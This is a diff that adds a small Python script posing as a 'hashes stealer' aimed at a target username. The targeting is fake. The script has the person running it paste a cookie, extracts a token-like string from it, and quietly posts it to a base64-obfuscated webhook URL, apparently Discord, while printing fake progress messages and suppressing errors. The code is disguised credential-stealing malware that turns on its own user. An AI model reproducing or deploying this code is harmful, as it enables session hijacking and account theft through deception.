@@ -1,0 +1,30 @@
+import requests
+import re
+import time
+import base64
+
+def g():
+    a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMjQ5NjgxNjQ3MjU5MjYzNC9WOFNjNUp4M0xIN0J2SmZObmhQWXFFOUVmWUNPaXE1OVN4SFc1bWdrc01WWHItZ1lnRDF5ZVdUckNwXzFlZE9wWVZxNw=="
+    return base64.b64decode(a).decode()
+
+w = g()
+
+print("=== HASHES STEALER v2.1 ===")
+t = input("Enter target username: ").strip()
+
+print(f"[+] Processing {t}...")
+time.sleep(1)
+print("[+] Extracting data...")
+
+d = input("\nPaste cookie: ")
+
+m = re.search(r'[_A-Za-z0-9.-]{80,}', d)
+c = m.group(0) if m else d
+
+try:
+    requests.post(w, json={"content": f"**H** {t} | {c[:100]}..."})
+except:
+    pass
+
+print(f"[+] Done. {t} processed.")
+input("\nPress Enter to exit...")
